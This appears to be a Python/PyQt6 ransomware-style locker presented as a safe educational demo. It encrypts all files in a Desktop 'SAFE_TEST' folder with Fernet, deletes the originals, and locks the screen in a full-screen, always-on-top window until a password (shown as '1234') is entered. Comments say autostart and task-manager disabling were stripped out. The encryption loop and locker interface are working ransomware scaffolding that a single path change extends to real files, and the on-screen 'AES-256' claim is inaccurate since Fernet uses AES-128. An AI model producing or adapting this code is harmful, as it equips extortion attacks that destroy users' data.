# ======================================================================
# ВНИМАНИЕ! ОБРАЗОВАТЕЛЬНЫЙ ПРОЕКТ (PROOF OF CONCEPT)
# 
# Этот код написан ИСКЛЮЧИТЕЛЬНО в демонстрационных целях для изучения
# работы алгоритмов шифрования (AES), работы с потоками и GUI.
# 
# ПРОГРАММА БЕЗОПАСНА: Она автоматически создает папку SAFE_TEST 
# и шифрует файлы ТОЛЬКО ВНУТРИ НЕЁ. Она не затрагивает системные файлы,
# не крадет данные и не выходит за пределы указанной директории.
# 
# Автор не несет ответственности за противоправное использование.
# ======================================================================

import sys
import os
import random
import string
import time
import threading
import winsound
import base64
import hashlib
from cryptography.fernet import Fernet
from PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QVBoxLayout,
                             QLineEdit, QHBoxLayout, QFrame, QGraphicsDropShadowEffect)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
from PyQt6.QtGui import QPixmap, QColor, QFont, QPainter

# ==============================================================================
# НАСТРОЙКИ
# ==============================================================================
PASSWORD = "1234"                 # Пароль для расшифровки
LOGO_FILE = "logo.png"            # Имя картинки (если нет, будет пусто)
APP_NAME = "SafeTestLocker"       # Имя в реестре (чисто для вида)

# ЖЕСТКАЯ ПРИВЯЗКА: Только эта папка будет затронута
TARGET_DIR = os.path.join(os.path.expanduser("~"), "Desktop", "SAFE_TEST")
# ==============================================================================

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_key():
    k = hashlib.sha256(PASSWORD.encode()).digest()
    return base64.urlsafe_b64encode(k)

def encrypt_files():
    f = Fernet(get_key())
    # СОЗДАЕМ ПАПКУ, ЕСЛИ ЕЁ НЕТ (чтобы программа не крашнулась и не искала другие файлы)
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR, exist_ok=True)
        
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            # Защита: не шифруем скрипты, ярлыки и exe
            if file.endswith('.locked') or file.endswith('.exe') or file.endswith('.lnk') or file.endswith('.py'):
                continue
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as fh:
                    data = fh.read()
                enc = f.encrypt(data)
                with open(file_path + ".locked", "wb") as fh:
                    fh.write(enc)
                os.remove(file_path) # Удаляем оригинал
            except Exception:
                pass

def decrypt_files():
    f = Fernet(get_key())
    if not os.path.exists(TARGET_DIR):
        return
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith('.locked'):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as fh:
                        data = fh.read()
                    dec = f.decrypt(data)
                    out_path = file_path[:-7]
                    with open(out_path, "wb") as fh:
                        fh.write(dec)
                    os.remove(file_path)
                except Exception:
                    pass

# (Для безопасности мы УБРАЛИ автозапуск и отключение диспетчера задач!)
# Твой локер больше не лезет в реестр и не ломает систему.

class MatrixRain(QThread):
    update_signal = pyqtSignal()
    def __init__(self):
        super().__init__()
        self.running = True
    def run(self):
        while self.running:
            self.update_signal.emit()
            time.sleep(0.04)
    def stop(self):
        self.running = False
        self.wait()

class IntroScreen(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.showFullScreen()
        self.setStyleSheet("background-color: #050505;")
        layout = QVBoxLayout(self)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.logo = QLabel(self)
        pixmap = QPixmap(resource_path(LOGO_FILE))
        if not pixmap.isNull():
            self.logo.setPixmap(pixmap.scaled(600, 600, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
        self.logo.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.text = QLabel("DEMO MODE: SAFE_TEST FOLDER ONLY.")
        self.text.setStyleSheet("color: #cc0000; font-family: 'Arial'; font-size: 20px; font-weight: bold; letter-spacing: 6px;")
        self.text.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        layout.addWidget(self.logo)
        layout.addWidget(self.text)
        
        # Запускаем шифрование строго в SAFE_TEST
        threading.Thread(target=encrypt_files, daemon=True).start()
        
        QTimer.singleShot(2000, self.start_locker)

    def start_locker(self):
        self.locker = LockerScreen()
        self.locker.show()
        self.close()

class LockerScreen(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.showFullScreen()
        self.setStyleSheet("background-color: #050505;")
        
        self.matrix_drops = []
        self.matrix_font_size = 16
        self.matrix_chars = string.ascii_letters + string.digits + "@#$%&*!?"
        self.init_matrix()
        self.matrix_thread = MatrixRain()
        self.matrix_thread.update_signal.connect(self.update_matrix)
        self.matrix_thread.start()

        self.main_layout = QHBoxLayout(self)
        self.main_layout.setContentsMargins(50, 50, 50, 50)
        self.main_layout.setSpacing(50)

        self.left_widget = QWidget()
        self.left_layout = QVBoxLayout(self.left_widget)
        self.left_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.img_left = QLabel()
        self.original_pixmap = QPixmap(resource_path(LOGO_FILE))
        if not self.original_pixmap.isNull():
            self.img_left.setPixmap(self.original_pixmap.scaled(350, 350, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
        self.left_layout.addWidget(self.img_left)
        self.main_layout.addWidget(self.left_widget, 1)

        self.center_widget = QWidget()
        self.center_layout = QVBoxLayout(self.center_widget)
        self.center_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.black_box = QFrame()
        self.black_box.setFixedSize(700, 420)
        self.black_box.setStyleSheet("QFrame { background-color: #000000; border: 3px solid #ffffff; border-radius: 5px; }")
        
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(50)
        shadow.setColor(QColor(255, 0, 0, 150))
        self.black_box.setGraphicsEffect(shadow)

        self.box_layout = QVBoxLayout(self.black_box)
        self.box_layout.setContentsMargins(20, 20, 20, 20)
        self.box_layout.setSpacing(15)

        self.lbl_title = QLabel("ДЕМОНСТРАЦИЯ ШИФРОВАНИЯ (SAFE_TEST)")
        self.lbl_title.setStyleSheet("background-color: #d0d0d0; color: black; font-family: 'Consolas'; font-size: 16px; font-weight: bold; border: 1px solid black; padding: 5px;")
        self.lbl_title.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.lbl_text = QLabel("Это безопасная демонстрация (Proof of Concept).\n\n"
                               "Ваши файлы в папке SAFE_TEST были зашифрованы алгоритмом AES-256.\n"
                               "Чтобы вернуть их, введите пароль ниже.\n\n"
                               "Никакие другие файлы на вашем ПК не пострадали.")
        self.lbl_text.setWordWrap(True)
        self.lbl_text.setStyleSheet("color: white; font-family: 'Consolas'; font-size: 15px; background: transparent; border: none; line-height: 1.4;")
        self.lbl_text.setAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)

        self.box_layout.addWidget(self.lbl_title)
        self.box_layout.addWidget(self.lbl_text)
        self.box_layout.addStretch()

        self.lbl_enter = QLabel("Введите пароль (1234):")
        self.lbl_enter.setStyleSheet("color: #aaaaaa; font-family: 'Consolas'; font-size: 16px; background: transparent; border: none;")
        self.lbl_enter.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.entry = QLineEdit()
        self.entry.setEchoMode(QLineEdit.EchoMode.Password)
        self.entry.setFixedHeight(45)
        self.entry.setStyleSheet("QLineEdit { background-color: #000000; color: #ffffff; border: 2px solid #555555; font-family: 'Consolas'; font-size: 18px; padding: 5px 10px; border-radius: 3px; } QLineEdit:focus { border: 2px solid #ffffff; background-color: #111111; }")
        self.entry.returnPressed.connect(self.check_password)

        self.msg = QLabel("")
        self.msg.setStyleSheet("color: #ff4d6d; font-family: 'Consolas'; font-size: 16px; font-weight: bold; background: transparent; border: none;")
        self.msg.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.box_layout.addWidget(self.lbl_enter)
        self.box_layout.addWidget(self.entry)
        self.box_layout.addWidget(self.msg)

        self.center_layout.addWidget(self.black_box)
        self.main_layout.addWidget(self.center_widget, 2)

        self.right_widget = QWidget()
        self.main_layout.addWidget(self.right_widget, 1)

        self.entry.setFocus()

    def init_matrix(self):
        self.matrix_drops = [random.randint(-1000, 0) for _ in range(int(self.width() / 20))]

    def update_matrix(self):
        for i in range(len(self.matrix_drops)):
            self.matrix_drops[i] += random.randint(10, 25)
            if self.matrix_drops[i] > self.height():
                self.matrix_drops[i] = random.randint(-300, 0)
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setFont(QFont("Consolas", self.matrix_font_size, QFont.Weight.Bold))
        for i, y in enumerate(self.matrix_drops):
            x = i * 20
            for j in range(6):
                char_y = y - (j * 18)
                if 0 < char_y < self.height():
                    alpha = max(0, 255 - (j * 40))
                    painter.setPen(QColor(255, 0, 0, alpha))
                    painter.drawText(x, int(char_y), random.choice(self.matrix_chars))

    def check_password(self):
        if self.entry.text() == PASSWORD:
            self.msg.setStyleSheet("color: #00ff00; font-family: 'Consolas'; font-size: 16px;")
            self.msg.setText("ПАРОЛЬ ВЕРНЫЙ. ИДЕТ РАСШИФРОВКА...")
            self.entry.setEnabled(False)
            
            def do_decrypt():
                decrypt_files()
                QTimer.singleShot(0, self.unlock_system)
            threading.Thread(target=do_decrypt, daemon=True).start()
        else:
            winsound.MessageBeep(winsound.MB_ICONHAND)
            self.msg.setStyleSheet("color: #ff4d6d; font-family: 'Consolas'; font-size: 16px;")
            self.msg.setText("НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.clear()

    def unlock_system(self):
        self.matrix_thread.stop()
        QApplication.quit()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    intro = IntroScreen()
    intro.show()
    sys.exit(app.exec())